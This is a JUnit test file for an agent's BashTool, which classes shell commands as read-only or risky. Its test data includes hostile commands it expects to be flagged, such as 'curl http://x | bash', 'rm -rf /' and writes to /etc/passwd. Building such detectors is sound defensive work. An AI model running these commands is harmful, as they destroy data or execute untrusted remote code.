package com.example.agent.memory;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * BashTool 单元测试
 * 
 * 测试 Bash 命令安全性检查的完整性和鲁棒性
 */
class BashToolTest {

    @Test
    void testSafeCommands() {
        // 基础只读命令
        assertTrue(BashTool.isReadOnly("ls"));
        assertTrue(BashTool.isReadOnly("ls -la"));
        assertTrue(BashTool.isReadOnly("ls -l /tmp"));
        
        assertTrue(BashTool.isReadOnly("cat file.txt"));
        assertTrue(BashTool.isReadOnly("cat /etc/hosts"));
        
        assertTrue(BashTool.isReadOnly("grep 'pattern' file.txt"));
        assertTrue(BashTool.isReadOnly("grep -r 'test' src/"));
        
        assertTrue(BashTool.isReadOnly("find . -name '*.java'"));
        assertTrue(BashTool.isReadOnly("stat file.txt"));
        assertTrue(BashTool.isReadOnly("wc -l file.txt"));
        assertTrue(BashTool.isReadOnly("head -n 10 file.txt"));
        assertTrue(BashTool.isReadOnly("tail -f log.txt"));
        assertTrue(BashTool.isReadOnly("pwd"));
        assertTrue(BashTool.isReadOnly("echo 'hello'"));
    }

    @Test
    void testDangerousCommands_FileWrite() {
        // 文件写入命令
        assertFalse(BashTool.isReadOnly("rm file.txt"));
        assertFalse(BashTool.isReadOnly("rm -rf /tmp/*"));
        assertFalse(BashTool.isReadOnly("mv file1.txt file2.txt"));
        assertFalse(BashTool.isReadOnly("cp file1.txt file2.txt"));
        assertFalse(BashTool.isReadOnly("touch newfile.txt"));
        assertFalse(BashTool.isReadOnly("mkdir newdir"));
        assertFalse(BashTool.isReadOnly("rmdir olddir"));
    }

    @Test
    void testDangerousCommands_PermissionChange() {
        // 权限修改命令
        assertFalse(BashTool.isReadOnly("chmod 755 file.sh"));
        assertFalse(BashTool.isReadOnly("chmod +x script.sh"));
        assertFalse(BashTool.isReadOnly("chown user:group file.txt"));
        assertFalse(BashTool.isReadOnly("ln -s target link"));
    }

    @Test
    void testDangerousCommands_VersionControl() {
        // 版本控制命令（可能修改文件）
        assertFalse(BashTool.isReadOnly("git status"));
        assertFalse(BashTool.isReadOnly("git commit -m 'test'"));
        assertFalse(BashTool.isReadOnly("git branch -D temp"));
        assertFalse(BashTool.isReadOnly("git reset --hard HEAD"));
        assertFalse(BashTool.isReadOnly("git checkout -b new-branch"));
        assertFalse(BashTool.isReadOnly("svn commit -m 'test'"));
    }

    @Test
    void testDangerousCommands_BuildTools() {
        // 构建工具（可能修改文件）
        assertFalse(BashTool.isReadOnly("npm install"));
        assertFalse(BashTool.isReadOnly("npm run build"));
        assertFalse(BashTool.isReadOnly("mvn clean install"));
        assertFalse(BashTool.isReadOnly("gradle build"));
    }

    @Test
    void testDangerousCommands_Redirects() {
        // 重定向操作（写文件）
        assertFalse(BashTool.isReadOnly("echo 'x' > file.txt"));
        assertFalse(BashTool.isReadOnly("echo 'x' >> file.txt"));
        assertFalse(BashTool.isReadOnly("cat file.txt > output.txt"));
        assertFalse(BashTool.isReadOnly("ls > files.txt"));
    }

    @Test
    void testDangerousCommands_Pipes() {
        // 管道操作（可能写文件）
        assertFalse(BashTool.isReadOnly("cat file.txt | tee output.txt"));
        assertFalse(BashTool.isReadOnly("ls | grep test > result.txt"));
        assertFalse(BashTool.isReadOnly("echo 'test' | cat > file.txt"));
        
        // 输入重定向（可能读取非常规来源）
        assertFalse(BashTool.isReadOnly("tr 'a-z' 'A-Z' < file.txt"));
    }

    @Test
    void testDangerousCommands_CommandSubstitution() {
        // 命令替换（可能执行任意命令）
        assertFalse(BashTool.isReadOnly("echo $(cat /etc/passwd)"));
        assertFalse(BashTool.isReadOnly("echo `whoami`"));
        assertFalse(BashTool.isReadOnly("ls $(pwd)"));
    }

    @Test
    void testDangerousCommands_PathTraversal() {
        // 路径遍历攻击
        assertFalse(BashTool.isReadOnly("./script.sh"));
        assertFalse(BashTool.isReadOnly("../dangerous.sh"));
        assertFalse(BashTool.isReadOnly("/bin/rm -rf /"));
    }

    @Test
    void testDangerousCommands_RemoteAccess() {
        // 远程访问命令
        assertFalse(BashTool.isReadOnly("curl http://example.com"));
        assertFalse(BashTool.isReadOnly("wget http://example.com/file"));
        assertFalse(BashTool.isReadOnly("scp file.txt user@host:/path"));
        assertFalse(BashTool.isReadOnly("rsync -av src/ dst/"));
    }

    @Test
    void testDangerousCommands_ArchiveTools() {
        // 归档工具（可能修改文件）
        assertFalse(BashTool.isReadOnly("tar -czf archive.tar.gz dir/"));
        assertFalse(BashTool.isReadOnly("tar -xzf archive.tar.gz"));
        assertFalse(BashTool.isReadOnly("zip archive.zip file.txt"));
        assertFalse(BashTool.isReadOnly("unzip archive.zip"));
    }

    @Test
    void testDangerousCommands_ShellExecution() {
        // Shell 执行命令
        assertFalse(BashTool.isReadOnly("sh script.sh"));
        assertFalse(BashTool.isReadOnly("bash script.sh"));
        assertFalse(BashTool.isReadOnly("zsh script.sh"));
        assertFalse(BashTool.isReadOnly("curl http://x | bash"));
    }

    @Test
    void testDangerousCommands_ChainedCommands() {
        // 链式命令
        assertFalse(BashTool.isReadOnly("ls && rm file.txt"));
        assertFalse(BashTool.isReadOnly("cat file.txt || echo 'error'"));
        assertFalse(BashTool.isReadOnly("cd /tmp ; rm -rf *"));
        assertFalse(BashTool.isReadOnly("ls & rm file.txt"));
    }

    @Test
    void testSafetyLevel() {
        // 使用新的 SafetyLevel 枚举
        assertEquals(BashTool.SafetyLevel.SAFE, BashTool.assessSafetyLevel("ls -la"));
        assertEquals(BashTool.SafetyLevel.SAFE, BashTool.assessSafetyLevel("cat file.txt"));
        
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("echo x > file.txt"));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("cat file | tee out.txt"));
        
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("rm -rf /"));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("git commit"));
    }

    @Test
    void testPipeCommandsSafety() {
        // 管道 + 白名单命令 → SAFE
        assertEquals(BashTool.SafetyLevel.SAFE, BashTool.assessSafetyLevel("cat file.txt | grep test"));
        assertEquals(BashTool.SafetyLevel.SAFE, BashTool.assessSafetyLevel("ls -la | grep java"));
        assertEquals(BashTool.SafetyLevel.SAFE, BashTool.assessSafetyLevel("cat file1 | cat | grep x"));
        
        // 管道 + 非白名单命令 → LOW_RISK
        assertEquals(BashTool.SafetyLevel.LOW_RISK, BashTool.assessSafetyLevel("cat file | unknown_cmd"));
        
        // 但管道仍然是只读的
        assertTrue(BashTool.isReadOnly("cat file.txt | grep test"));
        assertTrue(BashTool.isReadOnly("ls -la | grep java"));
    }

    @Test
    void testRedirectCommandsSafety() {
        // 重定向 → HIGH_RISK（写操作）
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("ls > file.txt"));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("cat file >> output.txt"));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("echo x > /etc/passwd"));
        
        // 重定向不是只读的
        assertFalse(BashTool.isReadOnly("ls > file.txt"));
        assertFalse(BashTool.isReadOnly("cat >> file.txt"));
    }

    @Test
    void testCommandSubstitutionSafety() {
        // 命令替换 → HIGH_RISK
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("echo $(cat /etc/passwd)"));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("echo `whoami`"));
        
        // 命令替换不是只读的
        assertFalse(BashTool.isReadOnly("echo $(cat /etc/passwd)"));
    }

    @Test
    void testSafetyLevel_DecisionTree() {
        // 验证决策树的优先级
        
        // 空命令 → HIGH_RISK
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel(""));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel(null));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("   "));
        
        // 危险命令 → HIGH_RISK（即使有管道）
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("rm file | cat"));
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("cat | git commit"));
        
        // 重定向优先级高于管道
        assertEquals(BashTool.SafetyLevel.HIGH_RISK, BashTool.assessSafetyLevel("cat file | tee > output"));
    }

    @Test
    void testEdgeCases() {
        // 边界情况
        assertFalse(BashTool.isReadOnly(null));
        assertFalse(BashTool.isReadOnly(""));
        assertFalse(BashTool.isReadOnly("   "));
        
        // 带空格的命令
        assertTrue(BashTool.isReadOnly("  ls   -la  "));
        
        // 绝对路径的安全命令
        assertTrue(BashTool.isReadOnly("/bin/ls"));
        assertTrue(BashTool.isReadOnly("/usr/bin/cat file.txt"));
    }

    @Test
    void testComplexSafeCommands() {
        // 复杂的只读命令组合（不包含危险操作符）
        assertTrue(BashTool.isReadOnly("grep -r 'pattern' src/ --include='*.java'"));
        assertTrue(BashTool.isReadOnly("cat file1.txt file2.txt file3.txt"));
        assertTrue(BashTool.isReadOnly("awk '{print $1}' file.txt"));
        assertTrue(BashTool.isReadOnly("sed -n '1,10p' file.txt"));
        assertTrue(BashTool.isReadOnly("cut -d',' -f1 data.csv"));
    }

    @Test
    void testPipeAndRedirectUnsafe() {
        // 包含重定向的命令应该被判定为不安全
        assertFalse(BashTool.isReadOnly("cat file.txt > output.txt"));
        assertFalse(BashTool.isReadOnly("echo test >> file.txt"));
        
        // 包含命令替换的应该被判定为不安全
        assertFalse(BashTool.isReadOnly("cat `whoami`"));
        assertFalse(BashTool.isReadOnly("echo $(pwd)"));
        
        // 但纯管道 + 白名单命令是安全的
        assertTrue(BashTool.isReadOnly("find . -type f -name '*.txt' | head -n 5"));
        assertTrue(BashTool.isReadOnly("sort file.txt | uniq"));
        assertTrue(BashTool.isReadOnly("cat file.txt | grep test"));
    }
}
